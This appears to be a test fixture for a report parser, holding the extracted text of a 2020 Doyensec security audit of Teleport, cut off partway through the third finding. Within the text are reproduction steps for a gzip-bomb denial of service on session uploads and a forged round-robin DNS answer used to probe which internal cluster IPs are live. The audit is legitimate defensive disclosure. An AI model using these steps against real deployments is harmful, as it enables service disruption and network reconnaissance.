@@ -1,0 +1,1081 @@
+{
+  "manifest": {
+    "id": "doyensec-teleport-q42020",
+    "vendor": "Doyensec",
+    "family": "doyensec",
+    "sourceRootEnv": "GOLDEN_REPORT_SOURCE_DIR",
+    "sourcePath": "Doyensec_Gravitational_Teleport_Testing_Q42020.pdf",
+    "textPath": "data/golden-reports/extracted-text/doyensec-teleport-q42020.txt",
+    "expectedPath": "data/golden-reports/expected/doyensec-teleport-q42020.json"
+  },
+  "expected": {
+    "id": "doyensec-teleport-q42020",
+    "expectedCount": 18,
+    "notes": [
+      "Seed golden report. Count gate only in phase 1."
+    ],
+    "negativeSections": [
+      "Table of Contents",
+      "Contents",
+      "Index",
+      "Scope",
+      "Executive Summary",
+      "Severity Definitions",
+      "Risk Scale",
+      "Methodology",
+      "Conclusion",
+      "Appendix",
+      "Disclaimer"
+    ]
+  },
+  "report": {
+    "id": "G-doyensec-teleport-q42020",
+    "slug": "doyensec-teleport-q42020",
+    "name": "doyensec-teleport-q42020",
+    "type": "PDF",
+    "uploadedAt": "2026-06-05T23:28:36.470Z",
+    "owner": "AI CTIX Analyzer",
+    "status": "Ready",
+    "findings": 18,
+    "critical": 0,
+    "high": 0,
+    "medium": 18,
+    "low": 0,
+    "summary": "Security Auditing Report Teleport Testing Q4 2020 Prepared for: Gravitational, Inc.",
+    "parsingStatus": "parsed",
+    "analysisVersion": 1,
+    "parserVersion": 1,
+    "parsingNotes": [
+      "Structured parser found no blocks; heuristic fallback was used.",
+      "NLP hybrid extraction produced 18 finding(s). Heuristic fallback output was suppressed to avoid duplicate findings."
+    ],
+    "content": "TODO\n\nSecurity Auditing Report \n\nTeleport Testing Q4 2020\n\nPrepared for: Gravitational, Inc. DBA Teleport \nPrepared by: Lorenzo Stella \nDate: March 18th, 2021\n\n WWW.DOYENSEC.COM \n\n © DOYENSEC\n\n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nTable of Contents \n\nTable of Contents \n\nRevision History \n\nContacts \n\nExecutive Summary \n\nMethodology \n\nProject Findings \n\nAppendix A - Vulnerability Classiﬁcation \n\nAppendix B - Remediation Checklist \n\nAppendix C - Hardening Recommendations \n\n1 \n\n2 \n\n2 \n\n3 \n\n6 \n\n7 \n\n59 \n\n60 \n\n62\n\n1\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nRevision History \n\nVersion\n\nDate\n\nDescription\n\n12/04/2020\n\nFirst release of the ﬁnal report\n\n1\n\n2\n\n3\n\n4\n\n12/09/2020\n\n12/10/2020\n\n03/18/2021\n\nPeer Review\n\nPeer Review\n\nAuthor\n\nLorenzo Stella\n\nLuca Carettoni\n\nJohn Villamil\n\nRetesting Update\n\nMohamed Ouad\n\nContacts \n\nCompany\n\nName\n\nEmail\n\nGravitational, Inc\n\nRussell Jones\n\nrjones@gravitational.com\n\nGravitational, Inc\n\nSasha Klizhentas\n\nsasha@gravitational.com\n\nGravitational, Inc\n\n Alexey Kontsevoy\n\nalexey@gravitational.com\n\nDoyensec, LLC\n\nDoyensec, LLC\n\n Luca Carettoni\n\nluca@doyensec.com\n\nJohn Villamil\n\njohn@doyensec.com\n\n2\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nExecutive Summary \n\nOverview \n\nGravitational, Inc (DBA \"Teleport\") engaged \nDoyensec to perform a security assessment of \nthe Teleport platform. Gravitational Teleport is a \ncloud-native SSH gateway for managing access \nto clusters of Linux servers via SSH or Kubernetes \nAPIs. \n\nThe project commenced on 11/09/2020 and \nended on 12/04/2020 requiring two (2) security \nresearchers, for a total of twenty-ﬁve (25) person/\ndays. The project resulted \nin eighteen (18) \nﬁndings of which ﬁve (4) were rated as medium or \nhigh severity. \n\nIn March 2021, Doyensec performed a retesting of \nthe Teleport platform and conﬁrmed the \neffectiveness of the applied mitigations. All \nissues with direct security impact have been \naddressed by Gravitational. \n\nWe list the agreed upon assets below: \n\n- Teleport Community \n\n- https://github.com/gravitational/teleport \n\n- Teleport Enterprise \n\n- https://github.com/gravitational/teleport.e \n\n- Teleport internal dependencies \n\nThe testing took place \nenvironment using the \nsoftware at the time of testing. \n\nin a development \nlatest version of the \n\nIn detail, this activity was performed on the \nfollowing releases: \n\n- Teleport v5.0.0-beta.10 \n\n- https://github.com/gravitational/teleport/releases/\n\ntag/v5.0.0-beta.10 \n\n- 3279a1b9da706c6dc583a560bab46aff9d329c63 \n\n- Teleport Enterprise \n\n- 441c6b110e13d71a34badd3d2e8cf774c19536d6 \n\nThis deliverable represents the state of all \ndiscovered vulnerabilities as of 03/18/2021. \n\nScoping Restrictions \n\nThe project consisted of a manual web \napplication security assessment, source code \nreview, and dynamic \ninstrumentation of the \ncommand line tools. \n\nTesting was conducted remotely from Doyensec \nEMEA and US ofﬁces. \n\nScope \n\nThrough meetings with Gravitational, the scope of \nthe project was clearly deﬁned. \n\n- Identify misconﬁgurations and vulnerabilities \n\nin Teleport Community and Enterprise \n\n- Evaluate the overall security posture and \nbest practices compared to other industry \npeers \n\nDuring the engagement, Doyensec did not \nencounter any major difﬁculties testing the \nf u n c t i o n a l i t i e s o f t h e a p p l i c a t i o n . T h e \nGravitational engineering team was very \nresponsive in debugging any issue to ensure a \nsmooth assessment. \n\nWhile testing included the review of the Teleport \ninternal dependencies, Doyensec did not perform \na complete source code review for all packages. \nThe U2F authentication feature utilizing hardware \nFIDO tokens as a second factor of authentication \nwas also excluded from the scope of this project. \n\nAuth connectors were also tested in this review, \nlimited to SAML, OIDC, and Github. \n\nIt is also important to notice that Teleport is a \nin which several \nhighly ﬂexible platform \n\n3\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\n- \n\n- \n\n- \n\nLack of consistent opaque responses for \nresources restricted by labels on the API. \n\nInconsistencies in the applications' session \ninvalidations practices. While the different \nsession expirations between AAP-protected \napplications and the auth server appear to be \ncarefully considered in the solution's design, a \nrobust revocation system is still missing. \n\nRequest body unmarshalling \nis missing \ncontent length checks. The widespread usage \nof a single function to parse requests' \npayloads turned out to be prone to Denial of \nService (DoS). \n\nconﬁgurations can be customized by the end-\nuser. For instance, permissions for roles/users are \ncompletely customizable, hence Doyensec \nfocused on vulnerabilities in the core logic instead \nin \nof enumerating potential misconﬁgurations \nuser-deﬁned policies. \n\nFindings Summary \n\nDoyensec researchers discovered and reported \neighteen (18) vulnerabilities \nin the Teleport \nplatform. While most of the issues are departures \nfrom best practices and \nlow-severity ﬂaws, \nDoyensec identiﬁed two (2) medium severity and \ntwo (2) high severity issues that can be leveraged \nto compromise the conﬁdentiality, integrity, and \navailability of the solution. \n\nis \n\nIt \nimportant to reiterate that this report \nrepresents a snapshot of the security posture of \nthe environment at a point in time. \n\nThe ﬁndings included multiple vulnerabilities in \nboth the design and implementation of some \nfeatures. Several Denial Of Service (DoS) issues \nw e re \ni d e n t i ﬁ e d d u r i n g t h e e n g a g e m e n t , \nexploitable both from authenticated and \nunauthenticated attack positions. A number of \nInsecure Design practices were highlighted, \nrelated to Content Spooﬁng or Unsafe Error \nHandling. The project also brought to light an \noutstanding \nissue concerning Teleport's AAP \nlogin mechanism, which if exploited can result in \na full authentication bypass. Doyensec also \nproposed several hardening improvements that \nwould make the overall platform more resilient \nagainst attacks. \n\nConsidering the overall complexity of the platform \nand the numerous endpoints, the security posture \nof the reviewed APIs was found to be in line with \nindustry best practices. \n\nAt the design level, Doyensec found the system to \nbe well architected with the exclusion of the \nfollowing aspects: \n\n4\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nRecommendations \n\nThe following recommendations are proposed \nbased on studying the Teleport security posture \nand vulnerabilities discovered during this \nengagement. \n\nShort-term improvements \n\n- W o r k o n m i t i g a t i n g t h e d i s c o v e r e d \nvulnerabilities. You can use Appendix B - \nRemediation Checklist to make sure that you \nhave covered all areas. \n\nLong-term improvements \n\n- \n\n- \n\n- \n\n- \n\nDesign and implement an invalidation system \nfor sessions, possibly based on an automatic \nsignature rotation mechanism or on a \ndedicated revocation \nlist for tokens also \naccounting for the signature date. \n\nDesign and implement a more robust JSON \nparsing function, which does not eagerly read \nthe whole request body or headers. \n\nLimit content injection attacks by returning \npredeﬁned error messages or always setting \na maximum accepted length and a restricted \ncharacter set on user-provided inputs. \n\nConsider implementing hardening, following \nAppendix C - Hardening Recommendations \n\n5\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\n- \n- \n- \n- \n\nNmap \nGosec \ngolangci-lint \nCurl, netcat and other Linux utilities \n\nWeb Application and API \nTechniques \n\nWeb assessments are centered around the data \nsent between clients and servers. In this realm, \nthe principle audit tool is the Burp Suite, however \nwe also use a large set of custom scripts and \nextensions to perform speciﬁc audit tasks. We \nfocus on authorization, authentication, integrity \nand trust. We study how data is interpreted, \nparsed, stored, and relayed between producers \nand consumers. \n\nWe subvert the client with malicious data through \nreﬂected and DOM based Cross Site Scripting and \nby breaking assumptions in trust. We test the \ninjection style ﬂaws \nserver endpoints for \nincluding, but not limited to, SQL, template, XML, \nand command injection ﬂaws. We look at each \nrequest and response pair for potential Cross Site \nRequest Forgery and race conditions. We study \nthe application for subtle logic issues, whether \nthey are authorization bypasses or \ninsecure \nobject references. Session storage and retrieval is \nscrutinized and user separation is thoroughly \ntested. \n\nWeb security is not limited to popular bug titles. \nDoyensec researchers understand the goals and \nneeds of the application to ﬁnd ways of breaking \nthe assumed control ﬂow. \n\nMethodology \n\nOverview \n\nDoyensec treats each engagement as a ﬂuid \nentity. We use a standard base of tools and \ntechniques from which we built our own unique \nmethodology. Our 30 years of information security \nexperience has taught us that mixing offensive \nand defensive philosophies is the key for standing \nagainst threats, thus we recommend a graybox \napproach combining dynamic fault injection with \nan in-depth study of source code to maximize the \nROI on bug hunting. \n\nDuring this assessment, we have employed \nstandard testing methodologies (e.g. OWASP \nTesting guide recommendations) as well as \ncustom checklists to ensure full coverage of both \ncode and vulnerabilities classes. \n\nSetup Phase \n\nGravitational provided access to the online \nenvironment, source code repository and binaries \nfor all components in scope. \n\nIn addition to the testing environment setup by \nGravitational, Doyensec created multiple virtual \nmachines to test different conﬁgurations and \nsetup. \n\nTooling \n\nWhen performing assessments, we combine \nmanual security testing with state-of-the-art tools \nin order to improve efﬁciency and efﬁcacy of our \neffort. \n\nDuring this engagement, we used the following \ntools: \n- \n- \n- \n- \n- \n\nBurp Suite \nProtobuffer Decoder \nProtoc \nNikto \nSSLScan \n\n6\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n \n \n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nProject Findings \n\nThe table below lists the ﬁndings with their associated ID and severity. The severity ranking and \nvulnerability classes are deﬁned in Appendix A at the end of this document. The vulnerability class \ncolumn groups the entry into a common category, while the status column refers to whether the ﬁnding \nhas been ﬁxed at the time of writing. \n\nThis table is organized by time of discovery. The issues at the top were found ﬁrst while those at the \nbottom were found last. Presenting the table in this fashion has a number of beneﬁts. It inherently shows \nthe path our auditing took through the target and may also reveal how easy or difﬁcult it was to discover \ncertain ﬁndings. As a security engagement progresses, the researchers will gain a deeper understanding \nof a target which is also shown in this table. \n\nFindings Recap Table \n\nID\n\nTitle\n\nVulnerability Class\n\nSeverity\n\nStatus\n\nTEL-Q420-1\n\nDecompression Bomb In \nDecompress Functions\n\nDenial of Service \n(DoS)\n\nInformational\n\nRisk \nAccepted\n\nTEL-Q420-2\n\nUnsafely Deferred Close Call \nOn *os.File\n\nInsecure Design\n\nInformational\n\nClosed\n\nTEL-Q420-3\n\nCluster IP Leakage Through \nRound-robin DNS Abusing \nDirect Session URLs\n\nCovert Channel \n(Timing Attacks, \netc.)\n\nTEL-Q420-4\n\nContent Spooﬁng Abusing \nError Pages\n\nInsecure Design\n\nTEL-Q420-5\n\nExistence Leak of Label-\nrestricted Resources\n\nInformation \nExposure\n\nLow\n\nLow\n\nLow\n\nRisk \nAccepted\n\nClosed\n\nClosed\n\nTEL-Q420-6\n\nInsecure Default \nTLSClientConﬁg In Dial \nFunction\n\nInsufﬁcient \nCryptography\n\nInformational\n\nClosed\n\nTEL-Q420-7\n\nLogin Cross Site Request \nForgery On Application Access \nFlow\n\nCross Site Request \nForgery (CSRF)\n\nTEL-Q420-8\n\nParameter Injection In Install \nApp Script\n\nTEL-Q420-9\n\nMissing Applications Session \nInvalidation On Parent Session \nInvalidations\n\nInjection Flaws (SQL, \nXML, Command, \nPath, etc)\n\nInsufﬁcient \nAuthentication and \nSession \nManagement\n\nTEL-Q420-10\n\nSystemic Server-Side Request \nForgery in Single Sign-On\n\nServer-Side Request \nForgery (SSRF)\n\nMedium\n\n7\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\nLow\n\nClosed\n\nLow\n\nClosed\n\nLow\n\nRisk \nAccepted\n\nRisk \nAccepted\n\n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nID\n\nTitle\n\nVulnerability Class\n\nSeverity\n\nStatus\n\nTEL-Q420-11\n\nCLI Content Spooﬁng Through \nRequest Reason Medium\n\nInsecure Design\n\nMedium\n\nClosed\n\nTEL-Q420-12\n\n AAP Headers Injection\n\nTEL-Q420-13\n\nUnprotected Prometheus \nDiagnostic Endpoint\n\nInjection Flaws (SQL, \nXML, Command, \nPath, etc)\n\nInsufﬁcient \nAuthentication and \nSession \nManagement\n\nLow\n\nClosed\n\nLow\n\nClosed\n\nTEL-Q420-14\n\nCA Pinning Does Not Check \nCertiﬁcate Expiration Date\n\nInsufﬁcient \nCryptography\n\nInformational\n\nClosed\n\nTEL-Q420-15\n\nUnauthenticated OOM DoS in \nReadJSON\n\nDenial of Service \n(DoS)\n\nHigh\n\nClosed\n\nTEL-Q420-16\n\nMultiple Unhandled Errors\n\nInsecure Design\n\nInformational\n\nClosed\n\nTEL-Q420-17\n\nToken Exposure Through Open \nRedirect Bypass In AAP \nAuthentication Flow\n\nInsecure Design\n\nHigh\n\nClosed\n\nTEL-Q420-18\n\nWeak Content-Security-Policy \nDirectives\n\nSecurity \nMisconﬁguration\n\nLow\n\nClosed\n\n8\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nFindings per Severity \n\nThe table below provides a summary of the ﬁndings per severity. \n\nCritical\n\nHigh\n\nMedium\n\nLow\n\nInformational\n\nFindings per Type \n\nThe table below provides a summary of the ﬁndings per vulnerability class. \n\nDenial of Service (DoS)\n\nInsecure Design\n\nCovert Channel (Timing Attacks, etc.)\n\nInformation Exposure\n\nInsufﬁcient Cryptography\n\nCross Site Request Forgery (CSRF)\n\nInjection Flaws (SQL, XML, Command, Path, etc)\n\nInsufﬁcient Authentication \nand Session Management\n\nServer-Side Request Forgery (SSRF)\n\nSecurity Misconﬁguration\n\n9\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n592201122121152 \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nTEL-Q420-1 Decompression Bomb In Decompress Functions\n\nSeverity\n\nVulnerability Class\n\nComponent\n\nStatus\n\nDescription \n\nInformational\n\nDenial of Service (DoS)\n\nlib/events/ﬁelds.go:111 \nlib/events/auditlog.go:825\n\nRisk Accepted\n\nWhile the \"ZipSlip\" arbitrary ﬁle overwrite vulnerabilities found during our Q2 2019 engagement (#10. \nSession Events and Chunks Insecure Decompress) were addressed, Teleport is still vulnerable to \ndecompression bombs and other related resource exhaustion attacks. A decompression bomb is a \nmalicious archive ﬁle designed to crash or render useless the program or system reading it. \n\nIn Teleport, two session streaming modes can be set through a RBAC option: sync and async. In async \nstreams, the stream is sent to the disk and then forwarded to the Auth server. From Teleport v5.0, async \nmode behaves differently from before, since all archive construction occurs on Auth server and the Nodes \nno longer construct any compressed archives. Nonetheless, for backward compatibility with all other \nAPIs, the legacy endpoints and mode still exists, making Teleport still vulnerable to decompression \nbombs. The following functions are performing insecure decompression operations: \n\n- ValidateArchive in lib/events/fields.go:111 \n\n// ValidateArchive validates namespace and serverID fields within all events // \nin the archive. \nfunc ValidateArchive(reader io.Reader, serverID string) error { \n tarball := tar.NewReader(reader) \n... \n zip, err := gzip.NewReader(tarball) \n if err != nil { \n return trace.Wrap(err) \n } \n defer zip.Close(); \n\n scanner := bufio.NewScanner(zip) \n... \n\n- unpackFile in lib/events/auditlog.go:822 \n\nfunc (l *AuditLog) unpackFile(fileName string) (readSeekCloser, error) { \n basename := filepath. Base(fileName) \n... \n reader, err := gzip.NewReader(source) \n if err != nil { \n\nreturn nil, trace.Wrap(err) \n\n } \n defer reader. Close() \n\n if _, err := io.Copy(dest, reader); \n... \n\n10\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\n return dest, nil \n} \n\nReproduction Steps \n\nHistorically, many methods to build decompression bombs exist . In order to trigger an insecure \ndecompression and reproduce the vulnerability, it is possible to follow these steps: \n\n1\n\n1. On a compromised node, an attacker downloads or creates a gzip (gz) bomb (e.g. 10MB to 10GB) 2\n2. The attacker copy the created gzip bomb ﬁle into the /var/lib/teleport/log/upload/sessions/\n\ndefault directory of the malicious node \n\n3. The attacker renames the gzip bomb ﬁle following the format {RANDOM_UUID}.chunks.gz, e.g.: \n\n# mv 10GB.gz 99999999-9999-4089-ae1e-8e24717b3e7e.chunks.gz \n\n4.\n\nIn the same folder, the attacker creates a 99999999-9999-4089-ae1e-8e24717b3e7e.index ﬁle with \nthe content: \n\n{\"file_name\":\"99999999-9999-4089-\nae1e-8e24717b3e7e.chunks.gz\",\"type\":\"chunks\",\"index\":0,\"offset\":0} \n\n5. To trigger a session upload, the attacker also creates a {RANDOM_UUID}.completed ﬁle: \n\ntouch 99999999-9999-4089-ae1e-8e24717b3e7e.completed \n\n6. Session ﬁles are uploaded to the Auth server's container and later copied as tar ﬁle into an S3 bucket. \n7. The attacker then tries to replay a session upload. The request will fail with the gateway timeout error. \n\n8. To verify the attack, check the size of the playback session in the Auth container. The ﬁle will be \n\nexpanded from the initial ~10MB into 10GB. \n\n https://www.unforgettable.dk/ \n1\n\n https://bomb.codes/bombs \n2\n\n11\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nImpact \n\nMedium. Depending on whether the unpacking occurs into memory or into the disk the process could be \neither killed by the Out Of Memory (OOM) Manager or the disk space could be exhausted, interrupting the \naudit log processing, storage, and therefore its availability. \n\nComplexity \n\nSuch attacks against the internal Teleport auth endpoint require full access to a node. From a technical \nstandpoint, these vulnerabilities are relatively easy to discover, but exploitation does require a good \nunderstanding of the overall Teleport infrastructure design. \n\nRemediation \n\nSince decompression bombs usually exceed what can be reasonably expected given their ﬁle size, the \ndecompression should be aborted after reaching a reasonable limit. In the case of Teleport, setting such \na limit is not possible, since customers with very large recordings may have a legit interest in having \nsession ﬁles in the order of GB. \n\nA potential best-effort solution could be implementing a robust gzip decoder with defenses against \ndeviation from the standard gzip format that could lead to dangerous compression ratios, malicious \narchive signatures, mismatching local and central directory headers, ambiguous UTF-8 ﬁlenames, invalid \nﬁle attributes, overlapping headers, overﬂow, underﬂow, sparseness, buffer bleeds, and so on. \n\nOn a different note, such a decoder would increase code complexity or break compatibility with some \ngenuine ﬁles, without doing much to protect callers against gzip bombs. Unpacking untrusted archives \nfrom an untrusted sources today still requires CPU, time and memory limits, and since setting such \nresource limits is not ideal, the Teleport team decided to mark this ﬁnding's severity as Informational. \n\nResources \n\n- \"archive/zip: reject certain invalid archives #33026\", discussion around archive readers threats on \n\nGolang's repository \nhttps://github.com/golang/go/issues/33026 \n\n- \"CWE-409: Improper Handling of Highly Compressed Data (Data Ampliﬁcation)\", MITRE Individual \n\nDictionary Deﬁnition \nhttps://cwe.mitre.org/data/deﬁnitions/409.html \n\n12\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nTEL-Q420-2 Unsafely Deferred Close Call On *os.File\n\nSeverity\n\nVulnerability Class\n\nComponent\n\nStatus\n\nDescription \n\nInformational\n\nInsecure Design\n\nlib/utils/unpack.go:115 \nlib/service/service.go:743 \nlib/events/ﬁlesessions/ﬁleuploader.go:116 \nlib/events/ﬁlesessions/ﬁlestream.go:121 \nlib/events/ﬁlesessions/ﬁlestream.go:85 \nlib/events/auditlog.go:663 \nlib/client/keystore.go:366 \nlib/client/keystore.go:290 \nlib/client/identityﬁle/identity.go:84\n\nClosed\n\nIn Go, whenever the io.Closer interface is implemented, after checking for errors it is common to \nimmediately defer its Close() method. Unfortunately this coding pattern is actually harmful to writable \nﬁles because deferring a function call ignores its return value, and the Close() method can return errors. \nWhen working with ﬁles, different OS implementations may vary their own behavior, but on POSIX \nsystems like Linux and MacOS, closing a ﬁle is handled by the close system call. The BSD man page \nfor close(2) talks about the errors it can return: \n\n3\n\nERRORS \n The close() system call will fail if: \n\n [EBADF] fildes is not a valid, active file descriptor. \n [EINTR] Its execution was interrupted by a signal. \n [EIO] A previously-uncommitted write(2) encountered an input/output \nerror. \n\nBecause data is not committed to the disk synchronously for performance reasons, the OS could return \nerrors similar to EIO, which means that data was lost trying to save it to the disk. In such cases, Teleport \nshould handle the error by checking the Close call return value, report the exception, and fail close. Many \noccurrences of this pattern of unhandled errors were found in Teleport: \n\n- In the extractFile function (lib/utils/unpack.go:68), the writeFile call extracts (:107) a single \nﬁle or directory from the audit session tarball into a target directory (used in lib/events/\nauditlog.go:698). Here the created ﬁle Close() call is deferred (lib/utils/unpack.go:115). \n\n- The PID ﬁle created by the Teleport daemon initiator is creating the ﬁle with 666 permissions and \n\ndeferring the ﬁle's Close() invocation (lib/service/service.go:743). \n\n https://www.freebsd.org/cgi/man.cgi?query=close&sektion=2#end \n3\n\n13\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\n- In the filesessions package, the Upload function uploads session recordings to ﬁle storage, and if a \nﬁle handler is passed, writes the ﬁle to a local directory (filesessions/fileuploader.go:110). \nAfter the creation (os.Create(path)), the resulting ﬁle call of the Close() function is deferred \n(:116). \n\n- The CompleteUpload function tries to set a lock in order to prevent other processes from accessing \nthe ﬁle until the write is completed (filesessions/filestream.go:121), without checking the \nClose() return value. \n\n- The UploadPart function handles multipart uploads for session streams. In filesessions/\n\nfilestream.go:85 the ﬁle's Close() call is deferred. \n\n- In the downloadSession function (events/auditlog.go:620), the tarball operations are deferring the \n\nﬁle's closure (:663) not checking its return value. \n\n- AddKnownHostKeys adds new entries to 'known_hosts' ﬁle, not closing it correctly (lib/client/\n\nkeystore.go:366). \n\n- The SaveCerts function saves trusted TLS certiﬁcates of certiﬁcate authorities in the certs.pem ﬁle. \nAfter writing the close value is not checked (lib/client/keystore.go:290) because of the deferred \nclose. \n\n- Package identityfile (lib/client/identityfile/identity.go) handles formatting and parsing \nof identity ﬁles. Its Write function, used to take a username and their credentials and save them to \ndisk, the Close() invocation is deferred (:84). \n\nReproduction Steps \n\nN/A \n\nImpact \n\nUnhandled exceptions related to disk I/O operations may occur and crash Teleport, skip the recording of \nauditing information, or leave it in a fail-open state. When handling errors, developers need to carefully \nchoose what actions to take. In deciding whether to fail open or to fail close, the outcomes of each must \nbe considered. \n\nWhile this issue is considered a departure from best practices, we did not identify speciﬁc circumstances \nhaving a clear security impact, hence we decided to report this issue as “Informational”. \n\nComplexity \n\nThe issue could present itself because of OS errors or faulty drives. An attacker could also abuse \nﬁrmware bugs or manufacturer faults, mechanical, electronic, or internal failures of the disks, or human \nerrors to exploit such conditions. \n\n14\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nRemediation \n\nFor security-sensitive writable ﬁles, Teleport developers should avoid the defer idiom since security-\nimpactful bugs may occur using such anti-pattern. Since ﬂushing the write buffer to disk may happen \neven after closing the ﬁle correctly, best practices suggest to force the write to the disk with \nthe Sync() method on *os.File, which calls the fsync system call. Checking for errors from this call will \nensure that the write occurred and may even detect early failing disks. \n\nResources \n\n- \"Don't defer Close() on writable ﬁles\", Joe Shaw \n\nhttps://www.joeshaw.org/dont-defer-close-on-writable-ﬁles/ \n\n15\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nTEL-Q420-3. Cluster IP Leakage Through Round-Robin DNS Abusing \nDirect Connection URLs\n\nSeverity\n\nVulnerability Class\n\nComponent\n\nStatus\n\nDescription \n\nLow\n\nCovert Channel (Timing Attacks, etc.)\n\nteleport/common/teleport.go\n\nRisk Accepted\n\nOne of the most important features of Teleport is the ability to start or share a session between users \nthrough their browsers. When initiating a web session from the Teleport UI, the user is redirected to a \nconnection URL including the targeted cluster name, node, and username, that will later be converted into \na speciﬁc UUID-based session URL: \n\nGET /web/cluster/doyensec-2020/console/node/test-hostname/test-username \n\nBoth the node and username parameters (test-hostname, test-username) can be arbitrarily set via the \nabove URL. Teleport will try to resolve the provided hostname to a registered cluster node IP and connect \nto it. This hostname resolution mechanism also seems to support round-robin DNS answers. \n\nIn its simplest implementation, round-robin DNS works by responding to DNS requests not only with a \nsingle potential IP address, but with a list of potential IP addresses corresponding to several servers that \nhost identical services. \n\nAn attacker can abuse this to leak the node number and IP addresses for a particular cluster by tricking a \nvictim to initiate an attacker-controlled connection action, providing a malicious round-robin DNS entry as \nthe node hostname. When the hostname resolution occurs, the attacker will return a DNS answer from his \ncontrolled hostname, including multiple address entries pointing both to attacker-controlled and \npotentially legit IPs. In this way, an attacker could infer out-of-band when a valid connection is established \nand consequently if a node exists on a cluster. Additionally, no trace of the domains used when \nconducting such attacks is logged, aside from the successfully opened sessions. \n\nReproduction Steps \n\nThe issue was dynamically reproduced in the doyensec-2020 test cluster, composed of a single \nip-172-31-35-86-ec2-internal instance pointing to 172.31.35.86. Two DNS records were set up on a \ncontrolled domain: \n\n$ dig @dns10.ovh.net one.bugbounty.it \n\n; <<>> DiG 9.10.6 <<>> @dns10.ovh.net one.bugbounty.it \n; (1 server found) \n;; global options: +cmd \n;; Got answer: \n\n16\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 35331 \n;; flags: qr aa rd; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1 \n\n;; OPT PSEUDOSECTION: \n; EDNS: version: 0, flags:; udp: 4096 \n;; QUESTION SECTION: \n;one.bugbounty.it. IN A \n\n;; ANSWER SECTION: \none.bugbounty.it. 3600 IN A 172.31.35.86 \none.bugbounty.it. 3600 IN A 172.31.35.85 \n\n;; Query time: 357 msec \n;; SERVER: 213.251.188.129#53(213.251.188.129) \n;; WHEN: Fri Nov 13 15:57:45 CET 2020 \n;; MSG SIZE rcvd: 77 \n\n$ dig @dns10.ovh.net two.bugbounty.it \n\n; <<>> DiG 9.10.6 <<>> @dns10.ovh.net two.bugbounty.it \n; (1 server found) \n;; global options: +cmd \n;; Got answer: \n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 42779 \n;; flags: qr aa rd; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1 \n\n;; OPT PSEUDOSECTION: \n; EDNS: version: 0, flags:; udp: 4096 \n;; QUESTION SECTION: \n;two.bugbounty.it. IN A \n\n;; ANSWER SECTION: \ntwo.bugbounty.it. 3600 IN A 172.31.35.87 \ntwo.bugbounty.it. 3600 IN A 172.31.35.86 \n\n;; Query time: 356 msec \n;; SERVER: 213.251.188.129#53(213.251.188.129) \n;; WHEN: Fri Nov 13 15:57:47 CET 2020 \n;; MSG SIZE rcvd: 77 \n\nWhile the one.bugbounty.it subdomain includes two consequent A records to 172.31.35.86 and \n172.31.35.85, the two.bugbounty.it subdomain includes two consequent A records to 172.31.35.87 and \n172.31.35.86. \n\nBy testing the direct connection URL, it is possible to verify that a connection will always be made to the \nonly live host (172.31.35.86) with both subdomains. This is because the SSH client will initially try to \nconnect to the ﬁrst IP speciﬁed on the DNS answer. If there are any problems, it will go to the second one, \nand so on: \n\n17\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n \n \n \n \n \n \n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nAn attacker could forge a DNS answer to infer out-of-band when a valid connection will be established: \n\n;; ANSWER SECTION: \ntwo.bugbounty.it. 3600 IN A 213.123.123.0 ; attacker-controlled \ntwo.bugbounty.it. 3600 IN A 172.31.35.84 ; try #1 \ntwo.bugbounty.it. 3600 IN A 213.123.123.1 ; attacker-controlled \ntwo.bugbounty.it. 3600 IN A 172.31.35.85 ; try #2 \ntwo.bugbounty.it. 3600 IN A 213.123.123.2 ; attacker-controlled \ntwo.bugbounty.it. 3600 IN A 172.31.35.86 ; try #3, here the attempts \nwill stop because a valid connection was made \ntwo.bugbounty.it. 3600 IN A 213.123.123.3 ; attacker-controlled, here no \nrequest will be made and the attacker will infer that 172.31.35.86 it's a valid \nnode \ntwo.bugbounty.it. 3600 IN A 172.31.35.87 ; try #4 \n\n ... \n\nImpact \n\nLow. An attacker could abuse this issue to extract network design information from an organization's \ncluster. This technique could be used as a ﬁrst step for more complicated attacks. \n\nComplexity \n\nMedium. An attacker needs to set up a custom DNS server or edit an existing controlled DNS record and \nmake an authenticated victim visit a malicious 